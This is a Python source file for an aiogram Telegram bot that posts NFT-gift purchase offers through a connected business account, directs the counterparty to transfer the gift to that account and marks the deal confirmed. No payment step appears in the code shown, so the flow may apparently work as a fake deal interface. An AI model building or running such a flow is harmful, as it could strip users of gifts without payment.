"""
NFT Deal Bot — тонкая aiogram-оболочка над core.

Чистая логика (парсинг, SQLite, state machine, тексты) — в core.py.
Этот файл содержит только:
* инициализацию Bot/Dispatcher,
* хендлеры aiogram, которые вызывают core.decide_* и отвечают пользователю,
* фоновую задачу истечения офферов,
* main().

Запуск:
    BOT_TOKEN=... python bot.py
"""

import asyncio
import logging
import os

from aiogram import Bot, Dispatcher, F
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.exceptions import TelegramBadRequest, TelegramForbiddenError
from aiogram.filters import CommandStart
from aiogram.types import (
    BusinessConnection,
    CallbackQuery,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    LinkPreviewOptions,
    Message,
)

import core as C

# ── Конфиг ────────────────────────────────────────────────────────────────
BOT_TOKEN = os.environ.get("BOT_TOKEN")
if not BOT_TOKEN:
    raise RuntimeError(
        "BOT_TOKEN не задан. Установите переменную окружения BOT_TOKEN "
        "(в Render: Settings → Environment)."
    )

DB_PATH = os.environ.get("DB_PATH", "deals.db")
GC_PERIOD = int(os.environ.get("GC_PERIOD_SECONDS", "300"))

logging.basicConfig(
    level=os.environ.get("LOG_LEVEL", "INFO").upper(),
    format="%(asctime)s %(levelname)s %(name)s: %(message)s",
)
log = logging.getLogger("nftdeal")

bot = Bot(BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()


# ── Клавиатуры ───────────────────────────────────────────────────────────
def kb_offer(order_id: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="Отклонить", callback_data=f"decline:{order_id}"),
        InlineKeyboardButton(text="Принять", callback_data=f"accept:{order_id}"),
    ]])


def kb_instruction(order_id, username, user_id) -> InlineKeyboardMarkup:
    if username:
        send_url = f"tg://resolve?domain={username}"
    elif user_id:
        send_url = f"tg://user?id={user_id}"
    else:
        send_url = "tg://settings"
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Открыть чат получателя ↗", url=send_url)],
        [InlineKeyboardButton(text="Подтвердить передачу", callback_data=f"confirm:{order_id}")],
    ])


# ── Business connection ──────────────────────────────────────────────────
@dp.business_connection()
async def handle_business_connection(bc: BusinessConnection):
    C.biz_set(bc.id, bc.user.id, bc.user.username, bool(bc.is_enabled))
    log.info("biz_conn %s id=%s user_id=%s",
             "ON" if bc.is_enabled else "OFF", bc.id, bc.user.id)


# ── Business message ─────────────────────────────────────────────────────
def _extract_gift_ref(message: Message):
    """Пробуем вытащить ссылку на подарок из структурированных полей или текста."""
    for attr in ("unique_gift", "gift"):
        obj = getattr(message, attr, None)
        if obj is None:
            continue
        g = getattr(obj, "gift", obj)
        name = getattr(g, "name", None) or getattr(g, "title", None)
        num = getattr(g, "number", None)
        if name and num is not None:
            return name.replace(" ", ""), str(num)
    ref = C.extract_gift_ref_from_text(message.text or message.caption or "")
    if ref:
        return ref
    for ent_list in (message.entities or [], message.caption_entities or []):
        for ent in ent_list:
            url = getattr(ent, "url", None) or ""
            r = C.extract_gift_ref_from_text(url)
            if r:
                return r
    return None


@dp.business_message(F.text)
async def handle_business_message(message: Message):
    bcid = message.business_connection_id
    if not bcid:
        return

    # Если это сообщение фиксирует факт передачи ранее принятого оффера —
    # помечаем gift_transferred=1 и выходим.
    ref = _extract_gift_ref(message)
    if ref:
        slug, num = ref
        pending = C.pending_find_by_gift(bcid, slug, num)
        if pending and pending["state"] == C.STATE_INSTRUCTION:
            C.pending_mark_transferred(pending["order_id"])
            log.info("gift_transferred order=%s", pending["order_id"])
            return

    parsed = C.parse_command(message.text or "")
    if not parsed:
        return
    link, amount, currency = parsed
    gift = C.parse_gift(link)
    if not gift:
        return
    gift_name, gift_num, slug = gift

    info = C.biz_get(bcid)
    if not info or not info["enabled"]:
        # event мог быть пропущен — восстанавливаем через API
        try:
            bc = await bot.get_business_connection(bcid)
            C.biz_set(bcid, bc.user.id, bc.user.username, True)
            info = C.biz_get(bcid)
        except Exception as e:
            log.error("get_business_connection bcid=%s: %s", bcid, e)
            return

    nft_url = f"https://t.me/nft/{slug}-{gift_num}"
    order_id = C.oid()

    try:
        sent = await bot.send_message(
            chat_id=message.chat.id,
            text=C.build_offer_plain(amount, currency, gift_name, gift_num),
            reply_markup=kb_offer(order_id),
            business_connection_id=bcid,
            link_preview_options=LinkPreviewOptions(is_disabled=True),
        )
    except (TelegramBadRequest, TelegramForbiddenError) as e:
        log.error("send_message bcid=%s: %s", bcid, e)
        return

    C.pending_insert({
        "order_id": order_id,
        "chat_id": message.chat.id,
        "msg_id": sent.message_id,
        "bcid": bcid,
        "amount": amount, "currency": currency,
        "gift_name": gift_name, "gift_num": gift_num, "gift_slug": slug,
        "nft_url": nft_url,
        "username": info["username"], "user_id": info["user_id"],
    })

    # Второй edit — только для превью. Если упадёт — оффер уже работает.
    await asyncio.sleep(1.0)
    try:
        await bot.edit_message_text(
            chat_id=message.chat.id, message_id=sent.message_id,
            text=C.build_offer_linked(amount, currency, gift_name, gift_num, nft_url),
            reply_markup=kb_offer(order_id),
            business_connection_id=bcid,
            link_preview_options=LinkPreviewOptions(
                is_disabled=False, prefer_large_media=True, show_above_text=True,
            ),
        )
    except TelegramBadRequest as e:
        log.warning("edit_preview order=%s: %s", order_id, e)


@dp.edited_business_message()
async def handle_edited_business(message: Message):
    bcid = message.business_connection_id
    if not bcid:
        return
    ref = _extract_gift_ref(message)
    if not ref:
        return
    slug, num = ref
    pending = C.pending_find_by_gift(bcid, slug, num)
    if pending and pending["state"] == C.STATE_INSTRUCTION:
        C.pending_mark_transferred(pending["order_id"])


# ── Callback handlers ───────────────────────────────────────────────────
@dp.callback_query(F.data.startswith("decline:"))
async def on_decline(cb: CallbackQuery):
    order_id = cb.data.split(":", 1)[1]
    action, meta = C.decide_decline(order_id, cb.from_user.id)
    if action == "session_lost":
        return await cb.answer(C.ERR_SESSION_LOST, show_alert=True)
    if action == "already_final":
        return await cb.answer("Предложение уже закрыто.")
    if action == "not_owner":
        return await cb.answer(C.ERR_NOT_OWNER, show_alert=True)
    if action == "wrong_state":
        return await cb.answer("Нельзя отклонить уже принятое.", show_alert=True)
    if action == "cas_lost":
        return await cb.answer("Состояние изменилось.")
    # action == "edit"
    try:
        await bot.edit_message_text(
            chat_id=meta["chat_id"], message_id=meta["msg_id"],
            text=C.DECLINED_TEXT, reply_markup=None,
            business_connection_id=meta["bcid"],
            link_preview_options=LinkPreviewOptions(is_disabled=True),
        )
    except TelegramBadRequest as e:
        log.error("decline_edit order=%s: %s", order_id, e)
        return await cb.answer(C.ERR_API, show_alert=True)
    await cb.answer("Отклонено.")


@dp.callback_query(F.data.startswith("accept:"))
async def on_accept(cb: CallbackQuery):
    order_id = cb.data.split(":", 1)[1]
    action, meta = C.decide_accept(order_id, cb.from_user.id)
    if action == "session_lost":
        return await cb.answer(C.ERR_SESSION_LOST, show_alert=True)
    if action == "already_instruction":
        return await cb.answer("Предложение уже принято.")
    if action == "already_final":
        return await cb.answer("Предложение уже закрыто.")
    if action == "not_owner":
        return await cb.answer(C.ERR_NOT_OWNER, show_alert=True)
    if action == "cas_lost":
        return await cb.answer("Состояние изменилось, обновите чат.")
    # action == "edit"
    try:
        await bot.edit_message_text(
            chat_id=meta["chat_id"], message_id=meta["msg_id"],
            text=C.build_instruction(
                meta["amount"], meta["currency"],
                meta["gift_name"], meta["gift_num"], order_id,
                meta["username"], meta["user_id"], meta["nft_url"],
            ),
            reply_markup=kb_instruction(order_id, meta["username"], meta["user_id"]),
            business_connection_id=meta["bcid"],
            link_preview_options=LinkPreviewOptions(
                is_disabled=False, prefer_large_media=True, show_above_text=True,
            ),
        )
    except TelegramBadRequest as e:
        # Откат state, иначе БД и UI разойдутся
        C.pending_cas_state(order_id, C.STATE_INSTRUCTION, C.STATE_OFFER)
        log.error("accept_edit order=%s: %s", order_id, e)
        return await cb.answer(C.ERR_API, show_alert=True)
    await cb.answer("Принято.")


@dp.callback_query(F.data.startswith("confirm:"))
async def on_confirm(cb: CallbackQuery):
    order_id = cb.data.split(":", 1)[1]
    action, meta = C.decide_confirm(order_id, cb.from_user.id)
    if action == "session_lost":
        return await cb.answer(C.ERR_SESSION_LOST, show_alert=True)
    if action == "already_final":
        return await cb.answer("Предложение уже закрыто.")
    if action == "not_accepted_yet":
        return await cb.answer("Сначала примите предложение.", show_alert=True)
    if action == "not_owner":
        return await cb.answer(C.ERR_NOT_OWNER, show_alert=True)
    if action == "not_transferred":
        return await cb.answer(C.ERR_NOT_RECEIVED, show_alert=True)
    if action == "cas_lost":
        return await cb.answer("Состояние изменилось, обновите чат.")
    # action == "edit"
    try:
        await bot.edit_message_text(
            chat_id=meta["chat_id"], message_id=meta["msg_id"],
            text=C.build_accepted(meta["amount"], meta["currency"], order_id),
            reply_markup=None,
            business_connection_id=meta["bcid"],
            link_preview_options=LinkPreviewOptions(is_disabled=True),
        )
    except TelegramBadRequest as e:
        C.pending_cas_state(order_id, C.STATE_CONFIRMED, C.STATE_INSTRUCTION)
        log.error("confirm_edit order=%s: %s", order_id, e)
        return await cb.answer(C.ERR_API, show_alert=True)
    await cb.answer("Подтверждено.")


@dp.message(CommandStart())
async def cmd_start(message: Message):
    await message.answer(C.START_TEXT)


# ── Фоновая задача истечения ─────────────────────────────────────────────
async def expire_loop():
    ttl = C.TTL_HOURS * 3600
    while True:
        try:
            for meta in C.pending_expired(ttl):
                if not C.pending_cas_state(meta["order_id"], C.STATE_OFFER, C.STATE_EXPIRED):
                    continue
                try:
                    await bot.edit_message_text(
                        chat_id=meta["chat_id"], message_id=meta["msg_id"],
                        text=C.EXPIRED_TEXT, reply_markup=None,
                        business_connection_id=meta["bcid"],
                        link_preview_options=LinkPreviewOptions(is_disabled=True),
                    )
                except (TelegramBadRequest, TelegramForbiddenError) as e:
                    log.warning("expire_edit order=%s: %s", meta["order_id"], e)
            C.pending_gc_finalized()
        except Exception:
            log.exception("expire_loop iteration failed")
        await asyncio.sleep(GC_PERIOD)


# ── main ─────────────────────────────────────────────────────────────────
async def main():
    C.db_init(DB_PATH)
    expire_task = asyncio.create_task(expire_loop())
    try:
        await dp.start_polling(
            bot,
            allowed_updates=[
                "business_connection",
                "business_message",
                "edited_business_message",
                "callback_query",
                "message",
            ],
        )
    finally:
        expire_task.cancel()


if __name__ == "__main__":
    asyncio.run(main())
